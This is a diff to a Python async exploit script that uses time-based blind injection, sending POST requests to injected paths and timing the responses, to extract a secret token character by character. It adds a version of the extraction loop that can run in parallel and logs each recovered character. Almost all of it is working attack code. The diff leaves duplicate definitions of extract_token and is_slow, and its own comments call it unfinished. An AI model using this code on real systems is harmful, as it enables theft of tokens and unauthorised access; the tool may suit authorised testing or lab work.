@@ -9,7 +9,9 @@ SLEEP_TIME = 5
 TIME_THRESHOLD = 4.5  # seconds to consider delay meaningful
 
 ### TODO: Need charset defined
-
+### Warning: Not all of these take advantage of concurrency at the moment
+### I don't know that I'll have time to finish these out. I started with some 
+### ideas and wanted to flush them out.
 
 async def is_slow(client: httpx.AsyncClient, injected_path: str) -> bool:
     """Send POST request to injected path and determine if it causes delay."""
@@ -122,6 +124,42 @@ async def extract_token(client: httpx.AsyncClient, max_len: int = 64) -> str:
         token_chars.append(c)
         print(f"[+] token[{pos:02}] = '{c}' -> {''.join(token_chars)}")
     return "".join(token_chars)
+
+
+async def extract_token(
+    client: httpx.AsyncClient,
+    ctx: ExploitContext,
+    api_key: str,
+    charset: str,
+    sleep_time: int,
+    logger: OffsecLogger,
+    max_len: int = 256,
+    concurrency: int = 1,  # >1 enables parallel extraction
+) -> str:
+    logger.info("Finding token length...")
+    token_len = await find_token_length(ctx, client, api_key, sleep_time, logger, max_len)
+
+    logger.info(f"Extracting token of length {token_len}...")
+
+    if concurrency == 1:
+        # Sequential
+        token_chars = []
+        for pos in range(1, token_len + 1):
+            c = await extract_char_at_pos(client, ctx, api_key, sleep_time, logger, pos, charset)
+            token_chars.append(c)
+            print(f"[+] token[{pos:02}] = '{c}' -> {''.join(token_chars)}")
+        return "".join(token_chars)
+    else:
+        # Parallel (bounded concurrency)
+        sem = asyncio.Semaphore(concurrency)
+
+        async def wrapped(pos: int) -> str:
+            async with sem:
+                return await extract_char_at_pos(client, ctx, api_key, sleep_time, logger, pos, charset)
+
+        tasks = [asyncio.create_task(wrapped(pos)) for pos in range(1, token_len + 1)]
+        chars = await asyncio.gather(*tasks)
+        return "".join(chars)
 
 
 async def is_slow(client: httpx.AsyncClient, injected_path: str) -> bool:
